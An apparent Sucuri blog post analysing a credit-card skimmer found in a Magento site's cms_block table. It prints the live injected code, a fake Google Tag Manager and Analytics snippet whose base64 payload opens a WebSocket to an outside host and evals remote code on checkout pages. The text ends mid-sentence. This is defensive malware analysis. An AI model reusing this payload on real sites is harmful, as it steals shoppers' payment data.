---
title: Google Tag Manager Skimmer Steals Credit Card Info From Magento Site
url: https://blog.sucuri.net/2025/02/google-tag-manager-skimmer-steals-credit-card-info-from-magento-site.html
source: Sucuri Blog
date: 2025-02-07
fetch_date: 2025-10-06T20:34:14.256881
---

# Google Tag Manager Skimmer Steals Credit Card Info From Magento Site

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Magento Security](https://blog.sucuri.net/category/magento-security)
* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)

# Google Tag Manager Skimmer Steals Credit Card Info From Magento Site

[![](https://secure.gravatar.com/avatar/3bb7fb42c6bf04c758d570c2f6bb217266c127e77766dc9d8e6754f15cdd5867?s=60&d=mm&r=g)](https://blog.sucuri.net/author/puja-srivastava)

[Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava)

* February 6, 2025

![Google Tag Manager Skimmer Steals Credit Card Info from Magento](https://blog.sucuri.net/wp-content/uploads/2025/02/Google-Tag-Manager-Skimmer-Steals-Credit-Card-Info-from-Magento-820x386.jpg)

At Sucuri, we are committed to protecting websites from malware and other cyber threats. Recently, we were contacted by a customer who had experienced credit card data theft from their Magento-based eCommerce website. After an extensive investigation, we were able to trace the malware responsible for what was happening back to the Google Tag Manager script and assist in restoring the site’s security. We have detailed a previous similar infection here [Malicious Activities with Google Tag Manager](https://blog.sucuri.net/2018/04/malicious-activities-google-tag-manager.html).

## What was noticed?

The customer reached out to us with a concerning issue: they had discovered that sensitive customer data, specifically credit card details, was being stolen from their Magento site. This type of breach is especially troubling because it can lead to financial losses, loss of customer trust, and significant damage to the website’s reputation.

## What is a Google Tag Manager?

Google Tag Manager (GTM) is a free tool from Google that allows website owners to manage and deploy marketing tags on their website without needing to modify the site’s code directly. It simplifies the process of adding and updating tags for things like Google Analytics, AdWords, Facebook Pixel, and more, making it easier for marketers to track website activity and optimize campaigns without involving developers every time a change is needed.

```
<script>http://www.googletagmanager.com/gtm.js?id=GTM-'ID'</script>
```

The `<script>` tag loads the Google Tag Manager (GTM) JavaScript file, allowing you to manage and deploy tags on your website using the specified GTM container ID (GTM-ID).

## Tracing the Source of the Malware

During our investigation, we performed a deep dive into the website’s files, checking for any suspicious or unfamiliar code. It wasn’t long before we identified that the malware was being loaded from the database table `cms_block.content`.

```
<img src="google-manager.png" onerror="(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MLHK2N68');">
<script>(function(i, s, h, k, l, o, c, m) {m['GoogleAnalyticsObjects'] = o; c = s.createElement(h), i = s.getElementsByTagName(h)[0]; if (l.href.match(new RegExp(atob(o)))) {c.async = 1; c.src = new Function(atob(k)).call(this);}})('jb', document, 'script', 'd2luZG93Lnd3ID0gbmV3IFdlYlNvY2tldCgoJ3dzczovL2V1cm93ZWJtb25pdG9ydG9vbC5jb20vY29tbW9uP3NvdXJjZT0nKSArIGVuY29kZVVSSUNvbXBvbmVudChsb2NhdGlvbi5ocmVmKSk7d2luZG93Lnd3Lm9ubWVzc2FnZT1mdW5jdGlvbihlKXtldmFsKGUuZGF0YSl9Ow==', window.location, 'Y2hlY2tvdXQ' + '=', '\/\/www.google-analytics.com\/analytics.js', window);</script>
```

At first glance, this code appears to be a standard Google Tag Manager (GTM) and Google Analytics tracking script, which is often used for website analytics and advertising purposes. However, closer examination revealed that this code was not used for legitimate tracking but was instead malicious in nature.

## New Findings and Ongoing Threats

In 2024, we published an article detailing how [Magecart veteran ATMZOW](https://blog.sucuri.net/2023/12/40-new-domains-of-magecart-veteran-atmzow-found-in-google-tag-manager.html) was found using Google Tag Manager for delivering malware. This new infection indicates that the tactic is still being widely used by attackers, this time flagged by [SiteCheck](https://sitecheck.sucuri.net/) under the names:

* **malware.magento\_shoplift?71.5**
* **malware.magento\_shoplift.171.51**
* **malware.magento\_shoplift.171.52**

![SiteCheck lookup](https://blog.sucuri.net/wp-content/uploads/2025/02/sitecheck-lookup.png)

During our investigation, we also uncovered a backdoor located in **./media/index.php**. This ...